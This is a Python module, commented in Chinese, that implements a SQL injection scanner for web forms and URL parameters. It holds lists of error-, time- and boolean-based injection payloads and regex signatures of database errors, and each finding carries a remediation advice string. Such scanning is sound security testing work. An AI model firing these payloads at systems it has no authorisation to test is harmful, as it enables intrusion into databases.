#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
SQL注入扫描器模块，负责扫描SQL注入漏洞
"""

import re
import logging
import time
import random
from difflib import SequenceMatcher
from urllib.parse import urlparse, urlencode, parse_qsl

logger = logging.getLogger('xss_scanner')

class SQLInjectionScanner:
    """SQL注入扫描器类，负责扫描SQL注入漏洞"""
    
    def __init__(self, http_client):
        """
        初始化SQL注入扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 基本的SQL注入Payload
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "')",
                "'))",
                "\")",
                "\"))",
                "';",
                "\";",
                "')) OR 1=1--",
                "')); OR 1=1--",
                "')) OR '1'='1'--",
                "')) OR '1'='1'#",
                "' OR '1'='1'--",
                "' OR '1'='1' --",
                "' OR '1'='1'#",
                "' OR '1'='1' #",
                "' OR 1=1--",
                "' OR 1=1 --",
                "\" OR 1=1--",
                "\" OR 1=1 --",
                "' OR 1=1#",
                "\" OR 1=1#",
                "')) UNION SELECT NULL--",
                "')) UNION SELECT NULL, NULL--",
                "')) UNION SELECT NULL, NULL, NULL--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL--"
            ],
            'time_based': [
                "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "\" OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "')) OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "' OR SLEEP(3)--",
                "\" OR SLEEP(3)--",
                "')) OR SLEEP(3)--",
                "' AND SLEEP(3)--",
                "\" AND SLEEP(3)--",
                "')) AND SLEEP(3)--",
                "'; WAITFOR DELAY '0:0:3'--",
                "\"; WAITFOR DELAY '0:0:3'--",
                "')); WAITFOR DELAY '0:0:3'--",
                "' OR pg_sleep(3)--",
                "\" OR pg_sleep(3)--",
                "')) OR pg_sleep(3)--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "\" AND 1=1--",
                "\" AND 1=2--",
                "')) AND 1=1--",
                "')) AND 1=2--",
                "' AND '1'='1'--",
                "' AND '1'='2'--",
                "\" AND \"1\"=\"1\"--",
                "\" AND \"1\"=\"2\"--",
                "')) AND ('1'='1')--",
                "')) AND ('1'='2')--"
            ]
        }
        
        # SQL错误特征
        self.sql_errors = [
            "SQL syntax.*?MySQL", "Warning.*?mysqli", "MySQLSyntaxErrorException",
            "valid MySQL result", "check the manual that corresponds to your (MySQL|MariaDB) server version",
            "MySqlClient\\.", "com\\.mysql\\.jdbc", "Zend_Db_(Adapter|Statement)_Mysqli_Exception",
            "SQLSTATE\\[\\d+\\]: Syntax error or access violation", "Uncaught mysqli_sql_exception",
            
            "ORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*?Driver", "Warning.*?oci_.*", "OracleConnection",
            "quoted string not properly terminated", "ORA-00936: missing expression",
            
            "Microsoft SQL Server", "MSSQL.*?Driver", "MSSQL.*?Exception", "Msg \\d+, Level \\d+, State \\d+",
            "Unclosed quotation mark after the character string", "Incorrect syntax near",
            
            "PostgreSQL.*?ERROR", "Warning.*?Pg_.*", "valid PostgreSQL result", "PgSqlException",
            "PSQLException", "org\\.postgresql\\.util\\.PSQLException",
            
            "CLI Driver.*?DB2", "DB2 SQL error", "db2_\\w+\\(",
            
            "SQLite3::query", "SQLite3Result", "SQLitException",
            
            "Warning.*?sqlite_.*?", "Warning.*?PDO::.*?",
            
            "HY000", "Dynamic SQL Error", "System\\.Data\\.SqlClient\\.SqlException", 
            "Exception.*?Sybase.*?", "Sybase message", "Sybase.*?Server message"
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的SQL注入漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描SQL注入: {field.get('name')} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 构建基准表单数据，用于比较
        base_form_data = {}
        for f in form.get('fields', []):
            if f.get('name'):
                # 对于目标字段使用无害值
                if f['name'] == field['name']:
                    base_form_data[f['name']] = 'test123'
                else:
                    base_form_data[f['name']] = f.get('value', '')
        
        # 发送基准请求
        if method == 'POST':
            base_response = self.http_client.post(action_url, data=base_form_data)
        else:
            base_response = self.http_client.get(action_url, params=base_form_data)
            
        if not base_response:
            return None
            
        # 测试基于错误的SQL注入
        for payload in self.payloads['error_based']:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            if not inject_response:
                continue
                
            # 检查是否有SQL错误
            if self._check_sql_errors(inject_response.text):
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Error-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': payload,
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于错误的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在SQL注入漏洞，攻击者可能能够执行任意SQL查询",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于时间的SQL注入
        for payload in self.payloads['time_based']:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 记录开始时间
            start_time = time.time()
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 如果响应时间超过了预期的延迟时间（考虑网络延迟），则可能存在时间盲注
            if response_time > 2.5:  # 考虑到网络延迟，使用略小于3秒的阈值
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Time-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': payload,
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于时间的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在基于时间的SQL注入漏洞，响应时间为{response_time:.2f}秒",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于布尔的SQL注入
        boolean_results = {}
        for payload in self.payloads['boolean_based']:
            # 构建注入表单数据
            inject_form_data = base_form_data.copy()
            inject_form_data[field['name']] = payload
            
            # 发送注入请求
            if method == 'POST':
                inject_response = self.http_client.post(action_url, data=inject_form_data)
            else:
                inject_response = self.http_client.get(action_url, params=inject_form_data)
                
            if not inject_response:
                continue
                
            # 记录响应内容和长度
            response_content = inject_response.text if hasattr(inject_response, 'text') else ''
            response_length = len(response_content)
            
            # 提取payload的逻辑部分，如1=1或1=2
            if "1=1" in payload or "'1'='1'" in payload or "\"1\"=\"1\"" in payload:
                logic_type = 'TRUE'
            else:
                logic_type = 'FALSE'
                
            # 记录结果
            if logic_type not in boolean_results:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'TRUE' and response_length > boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'FALSE' and response_length < boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
        
        # 如果收集到了两种逻辑的结果，比较它们
        if 'TRUE' in boolean_results and 'FALSE' in boolean_results:
            true_length = boolean_results['TRUE']['length']
            false_length = boolean_results['FALSE']['length']
            
            # 如果长度差异明显，则可能存在布尔盲注
            if abs(true_length - false_length) > 10:
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于布尔的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在布尔盲注漏洞，TRUE条件下响应长度为{true_length}，FALSE条件下响应长度为{false_length}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
            
            # 如果内容差异明显，则可能存在布尔盲注
            true_content = boolean_results['TRUE']['content']
            false_content = boolean_results['FALSE']['content']
            similarity = SequenceMatcher(None, true_content, false_content).ratio()
            
            if similarity < 0.9:  # 相似度低于90%
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'form_action': action_url,
                    'form_method': method,
                    'parameter': field['name'],
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在表单字段'{field['name']}'中发现基于布尔的SQL注入漏洞",
                    'details': f"表单提交到{action_url}的{field['name']}字段存在布尔盲注漏洞，TRUE和FALSE条件下的响应内容相似度为{similarity:.2f}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的SQL注入漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        logger.debug(f"扫描SQL注入参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 构建基准参数，用于比较
        base_params = query_params.copy()
        base_params[param] = 'test123'
        
        # 发送基准请求
        base_response = self.http_client.get(f"{base_url}?{urlencode(base_params)}")
        if not base_response:
            return None
            
        # 测试基于错误的SQL注入
        for payload in self.payloads['error_based']:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 发送注入请求
            inject_response = self.http_client.get(f"{base_url}?{urlencode(inject_params)}")
            if not inject_response:
                continue
                
            # 检查是否有SQL错误
            if self._check_sql_errors(inject_response.text):
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Error-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于错误的SQL注入漏洞",
                    'details': f"URL参数{param}存在SQL注入漏洞，攻击者可能能够执行任意SQL查询",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于时间的SQL注入
        for payload in self.payloads['time_based']:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 记录开始时间
            start_time = time.time()
            
            # 发送注入请求
            inject_response = self.http_client.get(f"{base_url}?{urlencode(inject_params)}")
            
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 如果响应时间超过了预期的延迟时间（考虑网络延迟），则可能存在时间盲注
            if response_time > 2.5:  # 考虑到网络延迟，使用略小于3秒的阈值
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Time-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于时间的SQL注入漏洞",
                    'details': f"URL参数{param}存在基于时间的SQL注入漏洞，响应时间为{response_time:.2f}秒",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
        
        # 测试基于布尔的SQL注入
        boolean_results = {}
        for payload in self.payloads['boolean_based']:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 发送注入请求
            inject_response = self.http_client.get(f"{base_url}?{urlencode(inject_params)}")
            if not inject_response:
                continue
                
            # 记录响应内容和长度
            response_content = inject_response.text if hasattr(inject_response, 'text') else ''
            response_length = len(response_content)
            
            # 提取payload的逻辑部分，如1=1或1=2
            if "1=1" in payload or "'1'='1'" in payload or "\"1\"=\"1\"" in payload:
                logic_type = 'TRUE'
            else:
                logic_type = 'FALSE'
                
            # 记录结果
            if logic_type not in boolean_results:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'TRUE' and response_length > boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
            elif logic_type == 'FALSE' and response_length < boolean_results[logic_type]['length']:
                boolean_results[logic_type] = {
                    'content': response_content,
                    'length': response_length,
                    'payload': payload
                }
        
        # 如果收集到了两种逻辑的结果，比较它们
        if 'TRUE' in boolean_results and 'FALSE' in boolean_results:
            true_length = boolean_results['TRUE']['length']
            false_length = boolean_results['FALSE']['length']
            
            # 如果长度差异明显，则可能存在布尔盲注
            if abs(true_length - false_length) > 10:
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于布尔的SQL注入漏洞",
                    'details': f"URL参数{param}存在布尔盲注漏洞，TRUE条件下响应长度为{true_length}，FALSE条件下响应长度为{false_length}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
            
            # 如果内容差异明显，则可能存在布尔盲注
            true_content = boolean_results['TRUE']['content']
            false_content = boolean_results['FALSE']['content']
            similarity = SequenceMatcher(None, true_content, false_content).ratio()
            
            if similarity < 0.9:  # 相似度低于90%
                return {
                    'type': 'SQL_INJECTION',
                    'subtype': 'Boolean-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': boolean_results['TRUE']['payload'],
                    'severity': '高',
                    'description': f"在URL参数'{param}'中发现基于布尔的SQL注入漏洞",
                    'details': f"URL参数{param}存在布尔盲注漏洞，TRUE和FALSE条件下的响应内容相似度为{similarity:.2f}",
                    'recommendation': "使用参数化查询或预处理语句，过滤用户输入，限制数据库权限"
                }
                
        return None
    
    def _check_sql_errors(self, content):
        """
        检查响应内容中是否包含SQL错误
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含SQL错误
        """
        if not content:
            return False
            
        for error in self.sql_errors:
            if re.search(error, content, re.IGNORECASE):
                return True
                
        return False
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 